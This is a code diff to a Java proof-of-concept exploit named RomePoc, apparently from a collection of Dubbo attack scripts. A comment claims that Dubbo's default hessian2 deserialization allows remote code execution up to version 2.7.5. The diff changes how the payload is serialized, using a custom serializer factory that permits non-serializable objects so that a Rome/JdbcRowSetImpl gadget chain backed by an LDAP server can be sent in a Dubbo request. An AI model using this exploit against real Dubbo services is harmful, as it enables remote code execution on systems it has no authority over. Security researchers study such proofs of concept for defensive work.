@@ -1,10 +1,12 @@
 package com.threedr3am.bug.dubbo;
 
+import com.caucho.hessian.io.Hessian2Output;
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.rowset.JdbcRowSetImpl;
 import com.threedr3am.bug.common.server.LdapServer;
 import com.threedr3am.bug.common.utils.Reflections;
+import com.threedr3am.bug.dubbo.support.NoWriteReplaceSerializerFactory;
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
 import java.lang.reflect.Array;
@@ -14,7 +16,6 @@ import java.util.HashMap;
 import java.util.Random;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.Cleanable;
-import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
 
 /**
  * dubbo 默认配置，即hessian2反序列化，都可RCE（dubbo版本<=2.7.5）
@@ -80,7 +81,10 @@ public class RomePoc {
     Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
 
     ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
-    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
+    Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
+    NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
+    sf.setAllowNonSerializable(true);
+    out.setSerializerFactory(sf);
 
     out.writeObject(s);
 
